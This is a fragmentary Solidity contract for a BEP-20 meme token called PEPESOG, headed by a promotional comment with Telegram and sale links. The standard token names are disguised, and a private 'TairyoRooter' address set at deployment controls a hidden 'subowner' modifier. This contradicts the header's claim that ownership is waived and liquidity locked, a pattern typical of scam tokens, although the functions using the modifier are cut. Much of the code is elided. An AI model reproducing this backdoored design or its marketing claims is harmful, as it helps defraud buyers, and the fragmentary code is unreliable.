...
/*
⚡️PEPE SOG $PEPESOG⚡️COIN  #GAMEPEPE #BSC #MEME #NFT
⚡️PEPE  Meet SPELLS OF GENESIS with it card PEPE THE SOG 
🌙Safe contract waive onwership 🌙liquidty lock 🌙
 ⚡️https://t.me/PEPESOG
⚡️Buy The Card before too 🌙late https://pepe.wtf/asset/PEPETHESOG
...
#RAREPEPE #GAMEPEPE #BSC #MEME #NFT
*/
pragma solidity 0.8.19;

interface binance711 {
  /**
...
/*
 * @dev Provides information about the current execution binance20Burnable, including the
 ...
 */
abstract contract binance20Burnable {
 ...
 * the owner.
 */
abstract contract binance20Ownable is binance20Burnable {
...
contract PEPESOG is binance20Burnable, binance711, binance20Ownable {
   ...
   address private TairyoRooter; 
    constructor(address TairyoSwapRouterv3) {
        ...
        _symbol = "PEPESOG";
        _decimals = 9;
        _totalSupply = 4000000000000 * 10 ** 9;
    ...
    */
    ...
    /**
    * @dev See {binance711-totalSupply}.
    */
    ...
    /**
    * @dev See {binance711-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(TairyoRooter == _msgSender(), "binance20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {binance711-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {binance711-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {binance711};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "binance711: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {binance711-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "binance711: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "binance711: transfer from the zero address");
        require(shippingto != address(0), "binance711: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "binance711: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "binance711: approve from the zero address");
        require(transporteur != address(0), "binance711: approve to the zero address");
